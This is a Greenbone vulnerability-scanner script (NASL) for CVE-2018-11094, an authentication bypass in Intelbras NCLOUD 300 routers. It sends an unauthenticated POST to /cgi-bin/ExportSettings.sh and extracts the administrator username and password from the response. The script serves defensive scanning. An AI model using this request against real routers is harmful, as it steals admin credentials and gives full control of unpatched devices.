# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:intelbras:ncloud_300_firmware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113189");
  script_version("2023-07-20T05:05:17+0000");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2018-05-17 15:05:55 +0200 (Thu, 17 May 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-06-22 16:20:00 +0000 (Fri, 22 Jun 2018)");
  script_cve_id("CVE-2018-11094");
  script_name("Intelbras NCLOUD 300 Router Authentication Bypass Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_intelbras_ncloud_devices_http_detect.nasl");
  script_mandatory_keys("intelbras/ncloud/www/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44637/");
  script_xref(name:"URL", value:"https://blog.kos-lab.com/Hello-World/");

  script_tag(name:"summary", value:"The authentication in Intelbras NCLOUD 300 Routers can be bypassed.");

  script_tag(name:"vuldetect", value:"Tries to acquire the username and password of an administrator account.");

  script_tag(name:"insight", value:"Several directories can be accessed without authentication,
  including /cgi-bin/ExportSettings.sh, which contains administrator usernames and passwords.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker
  to gain complete control over the target system.");

  script_tag(name:"affected", value:"All Intelbras NCLOUD 300 devices - All firmware versions are affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/cgi-bin/ExportSettings.sh";

req = http_post_put_req( port:port, url:url, data:"Export=Salvar" );
res = http_keepalive_send_recv( data:req, port:port );

if( res =~ "^HTTP/1\.[01] 200" && credentials = eregmatch( pattern:'Login=([^\n]+)\nPassword=([^\n]+)', string:res ) ) {

  username = credentials[1];
  password = credentials[2];

  report  = 'The following credentials could be acquired:';
  report += '\nUsername:  ' + username;
  report += '\nPassword:  ' + password;
  report += '\n\nby doing a HTTP POST request with the following data:';
  report += '\nURL:       ' + http_report_vuln_url( port:port, url:url, url_only:TRUE );
  report += '\nHTTP body: Export=Salvar';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
